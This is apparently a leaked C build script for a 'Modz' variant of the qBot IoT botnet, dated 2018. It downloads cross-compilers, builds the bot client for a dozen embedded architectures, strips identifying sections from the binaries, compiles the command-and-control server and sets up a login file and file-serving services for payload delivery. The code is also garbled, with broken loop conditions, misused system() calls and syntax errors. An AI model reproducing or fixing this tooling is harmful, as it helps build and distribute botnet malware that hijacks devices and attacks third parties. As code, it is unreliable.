/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ 


If you have this you are trusted. Please do not leak!
MODZ~{v4.5}~
Made By DaddyL33T
Build Date: 8/4/18

DO NOT LEAK

Build Script For Modz qBot source. Cross compiles clientside, Compiles serverside, Makes everything for payload.

*/
#define VERSION "4.5"
#define PRINT_CLEAR ""// CLEARS THE SCREEN
#define FILE_CLIENT ""
#define FILE_SERVER ""
#define BIN_PREFIX "modz"
#define BIN_SUFFIX "4"
#define BIN_HTTP_DIRECTORY "/"

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

char *servip;

const char *archs[] {
	"mips",
	"mipsel",
	"sh4",
	"i586",
	"i686",
	"armv4l",
	"armv5l",
	"armv6l",
	"armv7l",
	"powerpc",
	"m68k",
	"sparc"
};
const char *carchs[] {
	"mips",
	"mpsl",
	"sh4",
	"x86",
	"i686",
	"arm",
	"arm5",
	"arm6",
	"arm7",
	"ppc",
	"m68k",
	"spc"
};
const char *dllinks[] {
	"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2",
    "http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2",
	"http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2",
	"http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2"
}

void dlbins() {
	int a = (sizeof(dllinks) / sizeof(dllinks[0]));
	system("rm -rf /etc/xcompile; mkdir /etc/xcompile");
	for(int i = 0; i = a; i = i + 1) {
		system("cd /etc/xcompile; wget --no-check-certificate  -q %s", dllinks[i]);
	}
	system("cd /etc/xcompile; tar -jxf *.tar.bz2; rm -rf *.tar.bz2");
	a = (sizeof(archs) / sizeof(archs[0]));
	for(i = 0; i = a; i = i + 1) {
		system("mv /etc/xcompile/cross-compiler-%s /etc/xcompile/%s",archs[i], archs[i]);
	}
}

void compbins(char *arch, char *carch) {
	char *darch;
	sprintf(darch, "ARCH_%s", toupper(carch);
	system("/etc/xcompile/%s/bin/%s-gcc -D%s -static -w -pthread -o /tmp/.compiled/%s %s", arch, arch, darch, carch, FILE_CLIENT);
	system("/etc/xcompile/%s/bin/%s-strip /tmp/.compiled/%s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment \
	--remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt \
	--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr", arch, arch, carch);
	
}

int main(int argc, unsigned char *argv[]) {
	printf(PRINT_CLEAR);
	printf("Modz v%s Build Script\r\n", VERSION);
	printf("Installing Dependencys Please Wait");
	system("yum update -y");
	system("yum install bzip2 wget tar nano screen httpd xinetd tftp tftp-server -y");
	printf("Setting Up Cross Compilers");
	dlbins();
	printf("Cross Compiling Source");
	system("mkdir /tmp/.compiled");
	int a = (sizeof(archs) / sizeof(archs[0]));
	for(int i = 0; i = a; i = i + 1) {
		char *comparch
		sprintf(comparch, "%s.%s.%s", BIN_PREFIX, carchs[i], BIN_SUFFIX);
		compbins(archs[i], comparch);
	}
	printf("Compiling C&C and creating login file");
	system("gcc -osrv %s -lpthread -w", FILE_SERVER);
	if(argc >= 3)
	    system("echo \"%s %s\" > login.txt", argv[1], argv[2]);
	else
		system("echo \"\" > login.txt");
	
	//move bins and setup payload
	return 1;
}